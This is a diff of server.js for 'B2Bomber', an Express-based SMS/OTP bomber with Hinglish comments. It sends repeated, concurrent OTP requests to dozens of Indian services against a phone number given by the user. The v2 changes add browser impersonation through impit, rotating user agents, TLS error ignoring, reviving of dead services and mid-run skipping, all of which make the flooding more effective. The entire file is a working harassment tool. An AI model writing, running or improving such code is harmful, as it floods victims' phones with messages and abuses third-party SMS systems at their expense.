@@ -1,16 +1,19 @@
-
 /* ============================================================
- * B2Bomber — OTP Sender  ·  server.js
- * Backend for public/index.html
+ * B2Bomber — OTP Sender  ·  server.js  (v2, fixed)
  *
- * Endpoints:
- *   GET  /api/health          -> { services, live, benched, solved }
- *   GET  /api/diag            -> full diagnostic dump
- *   GET  /api/selftest?number -> probe every service once, bench dead ones
- *   POST /api/bomb            -> NDJSON stream (start / result / done)
- *   POST /api/stats/reset     -> clear bench + counters
+ * FIXES vs v1:
+ *  - res.on('close') instead of req.on('close')  <-- run instantly
+ *    abort hone ka asli reason
+ *  - impit (browser impersonation) engine + undici fallback
+ *  - boot self-test ab bench NAHI karta (live count 95 rehta hai)
+ *  - self-test ek fail pe bench nahi karta, 2 attempt leta hai
+ *  - queue interleaved + mid-run bench: dead service ke baaki
+ *    repeats skip ho jaate hain (run fast, no 10x timeout waste)
+ *  - revive pass: live pool 25 se kam ho to benched services
+ *    dobara probe ho kar wapas live ho jaati hain
+ *  - safer rejection heuristic (sirf JSON/chhote body pe)
  *
- * Only dependency: express. Uses Node 18+ global fetch.
+ * Endpoints: /api/health /api/diag /api/selftest /api/bomb /api/stats/reset
  * ============================================================ */
 
 import express from 'express';
@@ -21,22 +24,25 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
 /* ---------------- config ---------------- */
 const PORT             = Number(process.env.PORT || 3000);
-const CONCURRENCY      = Number(process.env.CONCURRENCY || 14);
-const TIMEOUT_MS       = Number(process.env.TIMEOUT_MS || 8000);
+const CONCURRENCY      = Number(process.env.CONCURRENCY || 16);
+const TIMEOUT_MS       = Number(process.env.TIMEOUT_MS || 7000);
 const SELFTEST_TIMEOUT = Number(process.env.SELFTEST_TIMEOUT || 7000);
-const SELFTEST_CONC    = Number(process.env.SELFTEST_CONC || 14);
+const SELFTEST_CONC    = Number(process.env.SELFTEST_CONC || 16);
+const REVIVE_TIMEOUT   = Number(process.env.REVIVE_TIMEOUT || 5000);
+const REVIVE_BELOW     = Number(process.env.REVIVE_BELOW || 25);
 const BENCH_AFTER      = Number(process.env.BENCH_AFTER || 2);
 const AUTO_SELFTEST    = process.env.AUTO_SELFTEST !== '0';
 const TEST_NUMBER      = process.env.TEST_NUMBER || '9999999999';
+const ENGINE           = (process.env.ENGINE || 'auto').toLowerCase(); // auto | impit | fetch
 const MAX_SNIPPET      = 120;
 
-/* ---------------- small helpers ---------------- */
+/* ---------------- helpers ---------------- */
 const UAS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
-  'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0'
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
 ];
 const UA = () => UAS[(Math.random() * UAS.length) | 0];
 
@@ -68,21 +74,14 @@ const fillDeep = (v, n) =>
 const clean = (t) => String(t || '').replace(/<[^>]*>/g, ' ').replace(/&nbsp;/g, ' ').replace(/\s+/g, ' ').trim();
 const snippetOf = (t) => clean(t).slice(0, MAX_SNIPPET);
 
-/* bodies that look like success (HTTP 200) but are actually rejections */
-const GLOBAL_REJECT = /(invalid\s+(mobile|phone|number|msisdn)|not\s+a\s+valid\s+(mobile|phone|number)|too\s+many\s+requests|rate\s*limit|please\s+enter\s+a\s+valid|bad\s+request|unprocessable|number\s+is\s+invalid)/i;
+/* HTTP 200 but actually a rejection — only trusted on JSON / short bodies */
+const GLOBAL_REJECT = /("(success|status|isSuccess)"\s*:\s*(false|"false")|invalid\s+(mobile|phone|number|msisdn)|not\s+a\s+valid\s+(mobile|phone|number)|too\s+many\s+requests|rate\s*limit)/i;
 
 /* ---------------- service catalogue ----------------
- * fields:
- *   id, name            -> identity
- *   u: [ ...urls ]      -> candidates, tried in order until one answers
- *   method              -> default: POST if a body exists else GET
- *   form                -> urlencoded body template
- *   json                -> JSON body template (object)
- *   raw                 -> raw string body template
- *   headers             -> extra headers
- *   expect              -> regex that MUST match body for success
- *   reject              -> regex that MUST NOT match body
- *   loose               -> disable the global rejection heuristic
+ * u: [urls]        -> candidates, order me try hote hain
+ * form / json / raw-> body (tokens fill hote hain)
+ * expect / reject  -> body regex checks
+ * loose            -> global reject heuristic off
  * tokens: {d10} {e164} {ed10} {ee164} {all} {cc} {p}
  * ---------------------------------------------------- */
 const SERVICES = [
@@ -220,6 +219,7 @@ const SERVICES = [
   { id: 'treebo', name: 'Treebo', method: 'POST',
     u: ['https://www.treebo.com/api/v2/auth/login/otp/'],
     json: { phone_number: '{d10}' },
+    expect: /otp/i,
     headers: { referer: 'https://www.treebo.com/login/', origin: 'https://www.treebo.com', authorization: 'Bearer null' } },
 
   { id: 'redbus', name: 'redBus', method: 'POST', loose: true,
@@ -258,7 +258,7 @@ const SERVICES = [
     u: ['https://www.abhibus.com/api/otp'],
     json: { mobile: '{d10}' } },
 
-  /* ---------- food / delivery / quick-commerce ---------- */
+  /* ---------- food / delivery ---------- */
   { id: 'swiggy', name: 'Swiggy', method: 'POST',
     u: ['https://www.swiggy.com/dapi/auth/sms-otp'],
     json: { mobile: '{d10}', _csrf: '' },
@@ -355,7 +355,7 @@ const SERVICES = [
     u: ['https://www.cult.fit/api/otp'],
     json: { mobile: '{d10}' } },
 
-  /* ---------- fintech / finance ---------- */
+  /* ---------- fintech ---------- */
   { id: 'mobikwik', name: 'MobiKwik', method: 'POST',
     u: ['https://appapi.mobikwik.com/p/account/otp/cell'],
     json: { cell: '{d10}' },
@@ -444,14 +444,15 @@ const SERVICES = [
     u: ['https://www.uber.com/api/otp'],
     json: { phone: '{d10}' } },
 
-  /* ---------- local / legacy / other ---------- */
+  /* ---------- local / legacy ---------- */
   { id: 'sulekha', name: 'Sulekha',
-    u: ['https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber={d10}&rnd=0'] },
+    u: ['https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber={d10}&rnd=0'],
+    expect: /success|true|otp/i },
 
   { id: 'justdial', name: 'JustDial',
     u: ['https://www.justdial.com/functions/ajxandroid.php?phn={d10}&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile'] },
 
-  { id: 'naaptol', name: 'Naaptol',
+  { id: 'naaptol', name: 'Naaptol', loose: true,
     u: ['https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile={d10}'] },
 
   { id: 'spencers', name: 'Spencers',
@@ -496,11 +497,49 @@ for (const s of SERVICES) {
 }
 
 let pathSolved = 0;
-const stats = { startedAt: Date.now(), runs: 0, lastRun: 0, lastSent: 0, lastFailed: 0, selftests: 0 };
+const stats = { startedAt: Date.now(), runs: 0, lastRun: 0, lastSent: 0, lastFailed: 0, selftests: 0, revives: 0, engine: ENGINE };
 
-const liveCount = () => SERVICES.filter((s) => !s.benched).length;
+const liveList  = () => SERVICES.filter((s) => !s.benched);
+const liveCount = () => liveList().length;
 
-/* ---------------- http primitives ---------------- */
+/* ---------------- HTTP engine (impit impersonation -> undici fallback) ---------------- */
+let IMPIT = null;
+if (ENGINE !== 'fetch') {
+  try {
+    const mod = await import('impit');
+    const Impit = mod?.Impit ?? mod?.default?.Impit ?? mod?.default;
+    if (typeof Impit === 'function') {
+      IMPIT = new Impit({ browser: 'chrome', ignoreTlsErrors: true });
+      stats.engine = 'impit';
+      console.log('[B2Bomber] impit browser-impersonation engine ACTIVE');
+    }
+  } catch (e) {
+    console.log('[B2Bomber] impit unavailable -> undici fetch:', e?.message || e);
+  }
+}
+
+function buildRequest(svc, n) {
+  const headers = {
+    accept: '*/*',
+    'accept-language': 'en-IN,en;q=0.9',
+    'user-agent': UA(),
+    ...fillDeep(svc.headers || {}, n)
+  };
+  let body;
+  if (svc.json) {
+    headers['content-type'] = 'application/json';
+    body = JSON.stringify(fillDeep(svc.json, n));
+  } else if (svc.form) {
+    headers['content-type'] = 'application/x-www-form-urlencoded';
+    body = fill(svc.form, n);
+  } else if (svc.raw) {
+    if (!headers['content-type']) headers['content-type'] = 'application/json';
+    body = fill(svc.raw, n);
+  }
+  const method = svc.method || (body ? 'POST' : 'GET');
+  return { method, headers, body };
+}
+
 async function callOnce(svc, url, n, timeoutMs, outerSignal) {
   const ctrl = new AbortController();
   const timer = setTimeout(() => ctrl.abort(), timeoutMs);
@@ -509,35 +548,31 @@ async function callOnce(svc, url, n, timeoutMs, outerSignal) {
 
   const t0 = Date.now();
   try {
-    const headers = {
-      'user-agent': UA(),
-      accept: '*/*',
-      'accept-language': 'en-IN,en;q=0.9',
-      ...fillDeep(svc.headers || {}, n)
-    };
+    const { method, headers, body } = buildRequest(svc, n);
+    let res;
 
-    let body;
-    if (svc.json) {
-      headers['content-type'] = 'application/json';
-      body = JSON.stringify(fillDeep(svc.json, n));
-    } else if (svc.form) {
-      headers['content-type'] = 'application/x-www-form-urlencoded';
-      body = fill(svc.form, n);
-    } else if (svc.raw) {
-      if (!headers['content-type']) headers['content-type'] = 'application/json';
-      body = fill(svc.raw, n);
+    if (IMPIT) {
+      try {
+        res = await IMPIT.fetch(url, { method, headers, body, timeout: timeoutMs });
+      } catch (e) {
+        const left = timeoutMs - (Date.now() - t0);
+        if (left < 700) throw e;
+        res = await fetch(url, { method, headers, body, redirect: 'follow', signal: ctrl.signal });
+      }
+    } else {
+      res = await fetch(url, { method, headers, body, redirect: 'follow', signal: ctrl.signal });
     }
 
-    const method = svc.method || (body ? 'POST' : 'GET');
-    const res = await fetch(url, { method, headers, body, redirect: 'follow', signal: ctrl.signal });
     const text = (await res.text()).slice(0, 6000);
     const status = res.status;
     const ms = Date.now() - t0;
 
     let ok = status >= 200 && status < 300;
     let error = '';
+    const looksStructured = /^\s*[{[]/.test(text) || text.length < 800;
+
     if (ok && svc.expect && !svc.expect.test(text)) { ok = false; error = 'no-otp-marker'; }
-    if (ok && !svc.loose && GLOBAL_REJECT.test(text.slice(0, 1500))) { ok = false; error = 'rejected'; }
+    if (ok && !svc.loose && looksStructured && GLOBAL_REJECT.test(text.slice(0, 1500))) { ok = false; error = 'rejected'; }
     if (ok && svc.reject && svc.reject.test(text)) { ok = false; error = 'rejected'; }
     if (!ok && !error) error = status >= 400 ? 'HTTP ' + status : 'fail';
 
@@ -545,7 +580,10 @@ async function callOnce(svc, url, n, timeoutMs, outerSignal) {
   } catch (e) {
     const ms = Date.now() - t0;
     const timedOut = ctrl.signal.aborted && !(outerSignal && outerSignal.aborted);
-    return { ok: false, status: 0, ms, error: timedOut ? 'timeout' : (e && e.name === 'AbortError' ? 'aborted' : (e?.message || 'network error')), snippet: '', url };
+    const error = timedOut ? 'timeout'
+      : e?.name === 'AbortError' ? 'aborted'
+      : (e?.code || e?.message || 'network error');
+    return { ok: false, status: 0, ms, error: String(error).slice(0, 80), snippet: '', url };
   } finally {
     clearTimeout(timer);
     if (outerSignal) outerSignal.removeEventListener('abort', onOuter);
@@ -575,17 +613,16 @@ async function hit(svc, digits, outerSignal, timeoutMs = TIMEOUT_MS) {
 async function runPool(items, limit, worker) {
   let idx = 0;
   const n = Math.max(1, Math.min(limit, items.length));
-  const workers = Array.from({ length: n }, async () => {
+  await Promise.all(Array.from({ length: n }, async () => {
     while (true) {
       const i = idx++;
       if (i >= items.length) return;
       try { await worker(items[i]); } catch { /* keep going */ }
     }
-  });
-  await Promise.all(workers);
+  }));
 }
 
-/* ---------------- express app ---------------- */
+/* ---------------- express ---------------- */
 const app = express();
 app.disable('x-powered-by');
 app.set('trust proxy', 1);
@@ -598,7 +635,6 @@ app.use((req, res, next) => {
   if (req.method === 'OPTIONS') return res.sendStatus(204);
   next();
 });
-
 app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));
 
 /* ---------------- routes ---------------- */
@@ -609,6 +645,7 @@ app.get('/api/health', (req, res) => {
     live: liveCount(),
     benched: SERVICES.length - liveCount(),
     solved: pathSolved,
+    engine: stats.engine,
     uptime: Math.round((Date.now() - stats.startedAt) / 1000)
   });
 });
@@ -619,23 +656,17 @@ app.get('/api/diag', (req, res) => {
   res.json({
     ok: true,
     node: process.version,
+    engine: stats.engine,
     uptimeSec: Math.round((Date.now() - stats.startedAt) / 1000),
-    config: { CONCURRENCY, TIMEOUT_MS, SELFTEST_TIMEOUT, BENCH_AFTER, AUTO_SELFTEST },
+    config: { CONCURRENCY, TIMEOUT_MS, SELFTEST_TIMEOUT, REVIVE_TIMEOUT, REVIVE_BELOW, BENCH_AFTER, AUTO_SELFTEST },
     stats,
     counts: { total: SERVICES.length, live: liveCount(), benched: SERVICES.length - liveCount(), solved: pathSolved },
     services: SERVICES.map((s) => ({
-      id: s.id,
-      name: s.name,
+      id: s.id, name: s.name,
       method: s.method || (s.json || s.form || s.raw ? 'POST' : 'GET'),
-      urls: s.u,
-      activeUrl: s.solvedUrl,
-      benched: s.benched,
-      fails: s.fails,
-      ok: s.okCount,
-      fail: s.failCount,
-      lastStatus: s.lastStatus,
-      lastMs: s.lastMs,
-      lastError: s.lastError,
+      urls: s.u, activeUrl: s.solvedUrl,
+      benched: s.benched, fails: s.fails, ok: s.okCount, fail: s.failCount,
+      lastStatus: s.lastStatus, lastMs: s.lastMs, lastError: s.lastError,
       lastAt: s.lastAt ? new Date(s.lastAt).toISOString() : null
     }))
   });
@@ -654,29 +685,33 @@ app.post('/api/stats/reset', (req, res) => {
   res.json({ ok: true, services: SERVICES.length, live: liveCount() });
 });
 
-/* -------- self test: probe everything once, bench the dead -------- */
+/* -------- probe helper (retry before marking dead) -------- */
+async function probe(svc, digits, timeoutMs, attempts = 1) {
+  let r = null;
+  for (let i = 0; i < attempts; i++) {
+    r = await hit(svc, digits, null, timeoutMs);
+    if (r.ok) break;
+  }
+  return r;
+}
+
+/* -------- self-test -------- */
 let selftestRunning = null;
 
 async function doSelftest(number, benchDead = true) {
   const digits = nf(number).all || TEST_NUMBER;
   const results = [];
   await runPool(SERVICES.slice(), SELFTEST_CONC, async (svc) => {
-    const r = await hit(svc, digits, null, SELFTEST_TIMEOUT);
-    svc.lastStatus = r.status;
-    svc.lastMs = r.ms;
-    svc.lastError = r.ok ? '' : r.error;
-    svc.lastAt = Date.now();
-    if (r.ok) {
-      svc.okCount++; svc.fails = 0; svc.benched = false;
-    } else {
-      svc.failCount++; svc.fails++;
-      if (benchDead && svc.fails >= 1) svc.benched = true;
-    }
+    const r = await probe(svc, digits, SELFTEST_TIMEOUT, benchDead ? 2 : 1);
+    svc.lastStatus = r.status; svc.lastMs = r.ms;
+    svc.lastError = r.ok ? '' : r.error; svc.lastAt = Date.now();
+    if (r.ok) { svc.okCount++; svc.fails = 0; svc.benched = false; }
+    else { svc.failCount++; svc.fails++; if (benchDead) svc.benched = true; }
     results.push({ id: svc.id, name: svc.name, status: r.status, ms: r.ms, ok: r.ok, error: r.ok ? '' : r.error, snippet: r.snippet, url: r.url });
   });
   results.sort((a, b) => (b.ok - a.ok) || a.name.localeCompare(b.name));
   stats.selftests++;
-  return { ok: results.filter((r) => r.ok).length, total: results.length, number: digits, results };
+  return { ok: results.filter((r) => r.ok).length, total: results.length, number: digits, engine: stats.engine, results };
 }
 
 app.get('/api/selftest', async (req, res) => {
@@ -693,13 +728,14 @@ app.get('/api/selftest', async (req, res) => {
   }
 });
 
-/* -------- the main event: streaming bomb -------- */
+/* -------- streaming bomb -------- */
 app.post('/api/bomb', async (req, res) => {
   const digits = String(req.body?.number || '').replace(/\D/g, '');
   if (digits.length < 10 || digits.length > 15) return res.status(400).json({ error: 'invalid number' });
 
-  const repeat = Math.min(10, Math.max(1, parseInt(req.body?.repeat, 10) || 1));
-  const skipDead = !!req.body?.skipDead;
+  const repeat   = Math.min(10, Math.max(1, parseInt(req.body?.repeat, 10) || 1));
+  const skipDead = req.body?.skipDead !== false;
+  const autoRevive = req.body?.revive !== false;
 
   res.status(200);
   res.setHeader('Content-Type', 'application/x-ndjson; charset=utf-8');
@@ -709,54 +745,69 @@ app.post('/api/bomb', async (req, res) => {
 
   const send = (o) => { try { res.write(JSON.stringify(o) + '\n'); } catch { /* ignore */ } };
 
-  const pool = skipDead ? SERVICES.filter((s) => !s.benched) : SERVICES.slice();
+  /* ---- client-gone detection: res, NOT req ----
+     (req 'close' body-parse ke baad turant fire hota hai -> run abort ho jata tha) */
+  const outer = new AbortController();
+  let clientGone = false;
+  res.on('close', () => {
+    if (!res.writableEnded) { clientGone = true; outer.abort(); }
+  });
+
+  /* ---- revive pass: agar live pool chhota hai to benched ko dobara probe karo ---- */
+  if (skipDead && autoRevive && liveCount() < REVIVE_BELOW) {
+    const dead = SERVICES.filter((s) => s.benched);
+    if (dead.length) {
+      stats.revives++;
+      await runPool(dead, SELFTEST_CONC, async (svc) => {
+        if (clientGone) return;
+        const r = await hit(svc, digits, outer.signal, REVIVE_TIMEOUT);
+        if (r.ok) { svc.benched = false; svc.fails = 0; svc.okCount++; }
+        send({ type: 'probe', id: svc.id, name: svc.name, status: r.status, ms: r.ms, ok: r.ok, error: r.ok ? '' : r.error });
+      });
+    }
+  }
+
+  const pool = skipDead ? liveList() : SERVICES.slice();
   const skipped = SERVICES.length - pool.length;
   const total = pool.length * repeat;
-
   const t0 = Date.now();
-  send({ type: 'start', total, services: pool.length, repeat, skipped });
+
+  send({ type: 'start', total, services: pool.length, repeat, skipped, engine: stats.engine });
 
   if (!pool.length) {
     send({ type: 'done', total: 0, sent: 0, failed: 0, done: 0, ms: 0 });
     return res.end();
   }
 
-  const outer = new AbortController();
-  let closed = false;
-  req.on('close', () => { closed = true; outer.abort(); });
-
+  /* interleaved queue: round 1 ke saare services pehle, phir round 2 ...
+     isse mid-run bench kaam karta hai (dead service ke baaki repeats skip) */
   const queue = [];
-  for (const svc of pool) for (let i = 0; i < repeat; i++) queue.push(svc);
+  for (let r = 0; r < repeat; r++) for (const svc of pool) queue.push(svc);
 
   let sent = 0, failed = 0, done = 0;
 
   await runPool(queue, CONCURRENCY, async (svc) => {
-    if (closed) return;
-    const r = await hit(svc, digits, outer.signal);
+    if (clientGone) return;
 
-    svc.lastStatus = r.status;
-    svc.lastMs = r.ms;
-    svc.lastError = r.ok ? '' : r.error;
-    svc.lastAt = Date.now();
-
-    if (r.ok) {
-      sent++; svc.okCount++; svc.fails = 0; svc.benched = false;
-    } else {
-      failed++; svc.failCount++; svc.fails++;
-      if (svc.fails >= BENCH_AFTER) svc.benched = true;
+    /* is run me hi dead prove ho chuki service -> baaki repeats skip */
+    if (skipDead && svc.benched && svc.lastAt > t0) {
+      done++;
+      send({ type: 'result', id: svc.id, name: svc.name, status: 0, ms: 0, ok: false,
+             error: 'skipped', snippet: '', url: svc.solvedUrl || svc.u[0], done, sent, failed });
+      return;
     }
+
+    const r = await hit(svc, digits, outer.signal);
+    svc.lastStatus = r.status; svc.lastMs = r.ms;
+    svc.lastError = r.ok ? '' : r.error; svc.lastAt = Date.now();
+
+    if (r.ok) { sent++; svc.okCount++; svc.fails = 0; svc.benched = false; }
+    else { failed++; svc.failCount++; svc.fails++; if (svc.fails >= BENCH_AFTER) svc.benched = true; }
     done++;
 
     send({
-      type: 'result',
-      id: svc.id,
-      name: svc.name,
-      status: r.status,
-      ms: r.ms,
-      ok: r.ok,
-      error: r.ok ? '' : r.error,
-      snippet: r.snippet,
-      url: r.url,
+      type: 'result', id: svc.id, name: svc.name, status: r.status, ms: r.ms,
+      ok: r.ok, error: r.ok ? '' : r.error, snippet: r.snippet, url: r.url,
       done, sent, failed
     });
   });
@@ -769,9 +820,7 @@ app.post('/api/bomb', async (req, res) => {
 
 /* ---------------- static fallback ---------------- */
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
-
 app.use((req, res) => res.status(404).json({ error: 'not found' }));
-
 app.use((err, req, res, next) => {
   console.error('[b2bomber]', err?.message || err);
   if (!res.headersSent) res.status(500).json({ error: 'internal error' });
@@ -779,14 +828,14 @@ app.use((err, req, res, next) => {
 
 /* ---------------- boot ---------------- */
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[B2Bomber] listening on ${PORT} · ${SERVICES.length} services · concurrency ${CONCURRENCY}`);
+  console.log(`[B2Bomber] listening on ${PORT} · ${SERVICES.length} services · engine=${stats.engine} · concurrency=${CONCURRENCY}`);
   if (AUTO_SELFTEST) {
     setTimeout(() => {
-      console.log('[B2Bomber] auto self-test starting…');
-      doSelftest(TEST_NUMBER, true)
-        .then((r) => console.log(`[B2Bomber] self-test done: ${r.ok}/${r.total} live`))
-        .catch((e) => console.log('[B2Bomber] self-test failed:', e?.message));
-    }, 4000);
+      console.log('[B2Bomber] warm self-test (no bench)…');
+      doSelftest(TEST_NUMBER, false)
+        .then((r) => console.log(`[B2Bomber] warm self-test: ${r.ok}/${r.total} responded (nothing benched)`))
+        .catch((e) => console.log('[B2Bomber] warm self-test failed:', e?.message));
+    }, 3000);
   }
 });
 
